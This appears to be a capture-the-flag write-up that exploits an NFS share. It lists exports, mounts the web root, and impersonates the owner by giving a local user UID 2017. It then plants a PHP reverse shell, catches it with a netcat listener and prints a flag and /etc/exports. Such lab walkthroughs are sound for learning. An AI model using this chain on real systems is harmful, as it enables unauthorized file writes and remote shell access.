1) To know **which folder** has the server **available** to mount you an ask it using:
```
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

----------
## /home/ross

1) I’ll mount the `/home/ross` share using `mount`:
```
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt
```

---------------
## /var/www/html

1) I’ll unmount the home directory and mount the web root:
```
┌──(kali㉿kali)-[/]
└─$ sudo umount /mnt 
┌──(kali㉿kali)-[/]
└─$ sudo mount -t nfs 10.10.11.191:/var/www/html /mnt
```

------------

## NFS Imitation && Reverse Shell

1) I’ll create a hacker user on my machine:
```
┌──(kali㉿kali)-[/mnt]
└─$ sudo useradd hacker
```

2) This user will by default have a UID/GID of the highest ID found in /etc/passwd , plus one. Usually this will be 1001 . To change the UID, we run the following command::
```
┌──(kali㉿kali)-[/mnt]
└─$ sudo usermod -u 2017 hacker
```

3) In theory, we can leave the GID as is, but for complecity's sake we can change it as follows, using groupmod :
```
┌──(kali㉿kali)-[/mnt]
└─$ sudo groupmod -g 2017 hacker
```

4) Having created our impostor user, we should now be able to interact with the share mounted on /mnt/ , namely /var/www/html , by using su to run commands as hacker:
```
┌──(kali㉿kali)-[/]
└─$ sudo su hacker              
$ ls -l /mnt
total 44
drwxr-xr-x 2 hacker www-data  4096 Dec 27 16:40 css
drwxr-xr-x 2 hacker www-data  4096 Dec 27 16:40 images
-rw-r----- 1 hacker www-data 32532 Dec 27 16:40 index.html
drwxr-xr-x 2 hacker www-data  4096 Dec 27 16:40 js
```

5) Having assumed the UID/GID of 2017, we have successfully impersonated the directory's owner and can now, under the assumption that the share has been configured to allow rw privileges, write arbitrary files to that directory. We now add a reverse php shell, and save it as reverseshell.php in the webserver's filesystem. While on one shell we set up a netcat listener, all that's left to do is curl the script we just added to the webserver:
```
$ nano reverseshell.php 
```

6) I open a listening port with netcat:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234               
listening on [any] 1234 ..
```

7) I make the system run the shell, making an http request:
```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.11.191/reverseshell.php  
```
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234               
listening on [any] 1234 ...

```

8) I read the user.txt:
```
$ cat /home/alex/user.txt
c581edb94cc066263d478be564ddb61d
```

9) We made some assumptions about the file-share to get to this point. For one, as mentioned, we assumed that the directory was configured with the rw tag enabled. That means that we have both read- and write  permissions on the share (the actual directory's permissions notwithstanding). If we cat the NFS  configuration file, namely /etc/exports , we can take a closer look at the shares' settings.
```
$ cat /etc/exports  
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/www/html *(rw,sync,root_squash)
/home/ross *(sync,root_squash)
```
